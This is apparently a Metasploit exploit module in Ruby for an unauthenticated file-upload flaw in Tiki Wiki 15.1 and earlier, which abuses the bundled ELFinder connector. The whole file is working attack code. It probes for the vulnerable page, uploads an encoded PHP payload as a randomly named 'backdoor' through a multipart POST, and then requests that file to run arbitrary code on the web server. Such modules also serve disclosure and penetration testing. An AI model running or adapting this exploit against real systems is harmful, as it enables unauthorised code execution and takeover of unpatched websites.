# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Tiki Wiki Unauthenticated File Upload Vulnerability&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a file upload vulnerability in Tiki Wiki <= 15.1
        which could be abused to allow unauthenticated users to execute arbitrary code
        under the context of the webserver user.
 
        The issue comes with one of the 3rd party components. Name of that components is
        ELFinder -version 2.0-. This components comes with default example page which
        demonstrates file operations such as upload, remove, rename, create directory etc.
        Default configuration does not force validations such as file extension, content-type etc.
        Thus, unauthenticated user can upload PHP file.
 
        The exploit has been tested on Debian 8.x 64bit and Tiki Wiki 15.1.
      },
      &#039;Author&#039; =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # Vulnerability discovery and Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://www.mehmetince.net/exploit/tiki-wiki-unauthenticated-file-upload-vulnerability&#039; ],
          [ &#039;URL&#039;, &#039;https://tiki.org/article434-Security-update-Tiki-15-2-Tiki-14-4-and-Tiki-12-9-released&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jul 11 2016&#039;
      ))
 
      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [ true, "Installed path of Tiki Wiki", "/tiki/"])
        ], self.class)
  end
 
  def check
    url = normalize_uri(target_uri.path, "vendor_extra/elfinder/elfinder.html")
    res = send_request_cgi(
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(url)
    )
    if res && res.code == 200
      return Exploit::CheckCode::Appears
    end
    return Exploit::CheckCode::Safe
  end
 
  def exploit
    filename = rand_text_alpha(8 + rand(4)) + &#039;.php&#039;
    data = Rex::MIME::Message.new
    data.add_part(&#039;upload&#039;, nil, nil, &#039;form-data; name="cmd"&#039;)
    data.add_part(&#039;l1_Lw&#039;, nil, nil, &#039;form-data; name="target"&#039;)
    data.add_part(payload.encoded, &#039;application/octet-stream&#039;, nil, "form-data; name=\"upload[]\"; filename=\"#{filename}\"")
    print_status("Uploading backdoor file.")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "vendor_extra/elfinder/php/connector.minimal.php"),
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;     => data.to_s
     })
    if res && res.code == 200
      print_good("Backdoor successfully created.")
    else
      fail_with(Failure::Unknown, "#{peer} - Error on uploading file")
    end
    print_status("Trigging the exploit...")
    send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path, "vendor_extra/elfinder/files/" + filename)
     }, 5)
  end
end

